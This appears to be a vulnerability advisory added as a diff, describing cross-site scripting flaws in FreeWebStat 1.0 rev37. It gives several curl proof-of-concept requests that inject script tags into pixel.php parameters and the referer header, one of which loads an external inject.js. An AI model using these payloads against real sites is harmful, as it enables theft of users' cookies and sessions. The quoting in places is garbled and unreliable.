@@ -1,0 +1,41 @@
+source: http://www.securityfocus.com/bid/15601/info
+
+FreeWebStat is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. These may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+FreeWebStat version 1.0 rev37 is reported to affected; other versions may also be vulnerable.
+
+curl "http://www.example.com/fws/pixel.php"
+domain=<script>alert(1)</script>
+&site=<script>alert(2)</script>
+&jsref=<script>alert(3)</script>
+&jsres=<script>alert(4)</script>
+&jscolor=<script>alert(5)</script>?
+-A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1.3))"
+-e "http://www.example.com"
+
+curl "http://www.example.com/fws/pixel.php"
+domain=ush.it&site=aa&jsref=http://www.example.com&jsres=1337&jscolor=red?
+-e "http://www.example.com/search?q=lello+splendor++&hl=it&lr=&start=
+10&sa=N?
+-A "Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1; SV1; (R1 1.3))"
+
+curl "http://www.example.com/fws/pixel.php"
+domain=www.example.com&site=aa&jsref=http://www.example.com&jsres=13
+37&jscolor=red? -e "http://www.example.com"
+-A "Mozilla/4.0(compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1.3))"
+
+curl "http://www.example.com/fws/pixel.php"
+domain=<script>alert(1)</script>&site=
+<script>alert(2)&jsref=</script><script>alert(3)</script>
+&jsres=<script>alert(4)</script>&jscolor=
+<script>alert(5)</script>?
+-A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1.3))"
+-e "http://www.example.com"
+
+
+curl http://www.example.com/fws/pixel.php?site=
+&jsres=&jscolor=&jsref=http://www.example.com/search?
+q=ppoopp<script language=?javascript?-src=
+"http://www.example.com/fws/inject.js?></script>&hl=it" 
